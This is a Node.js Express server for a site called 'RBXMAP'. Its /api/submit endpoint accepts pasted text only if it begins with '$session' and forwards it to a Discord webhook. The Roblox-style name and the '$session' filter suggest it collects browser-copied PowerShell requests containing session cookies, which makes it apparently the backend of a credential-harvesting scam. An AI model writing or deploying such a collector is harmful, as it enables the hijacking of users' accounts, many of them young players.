require('dotenv').config();

const express = require('express');
const rateLimit = require('express-rate-limit');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const ROOT = __dirname;

if (!WEBHOOK_URL) {
  console.error('DISCORD_WEBHOOK_URL manquant');
  process.exit(1);
}

app.use(express.json({ limit: '1mb' }));

const submitLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { error: 'too_many_requests' },
  standardHeaders: true,
  legacyHeaders: false
});

app.get('/health', (req, res) => {
  res.json({ ok: true });
});

app.get('/favicon.ico', (req, res) => {
  res.type('ico');
  res.sendFile(path.join(ROOT, 'favicon.ico'));
});

app.get('/favicon.png', (req, res) => {
  res.type('png');
  res.sendFile(path.join(ROOT, 'favicon.png'));
});

app.get('/favicon-32.png', (req, res) => {
  res.type('png');
  res.sendFile(path.join(ROOT, 'favicon-32.png'));
});

app.use(express.static(ROOT, {
  maxAge: '7d',
  etag: true,
  index: false
}));

app.get('/', (req, res) => {
  res.set('Cache-Control', 'no-cache');
  res.sendFile(path.join(ROOT, 'index.html'));
});

function buildEmbed(text) {
  const maxChunk = 4088;
  const content = text.slice(0, maxChunk);

  return {
    title: '📥 Nouveau fichier reçu sur RBXMAP',
    description: '```\n' + content + '\n```',
    color: 0x22c55e,
    timestamp: new Date().toISOString(),
    footer: { text: 'RBXMAP' }
  };
}

app.post('/api/submit', submitLimiter, async (req, res) => {
  const text = typeof req.body?.text === 'string' ? req.body.text.trim() : '';

  if (!text || !text.startsWith('$session')) {
    return res.status(400).json({ error: 'invalid' });
  }

  try {
    const discordRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'RBXMAP',
        embeds: [buildEmbed(text)]
      })
    });

    if (!discordRes.ok) {
      const errBody = await discordRes.text();
      throw new Error(`Discord responded with ${discordRes.status}: ${errBody}`);
    }

    res.json({ success: true });
  } catch (err) {
    console.error('Erreur envoi Discord:', err.message);
    res.status(500).json({ error: 'send_failed' });
  }
});

app.listen(PORT, () => {
  const files = ['index.html', 'styles.css', 'script.js', 'favicon.ico', 'favicon-32.png'];
  const missing = files.filter((f) => !fs.existsSync(path.join(ROOT, f)));
  console.log(`RBXMAP running on port ${PORT}`);
  if (missing.length) console.warn('Fichiers manquants:', missing.join(', '));
});
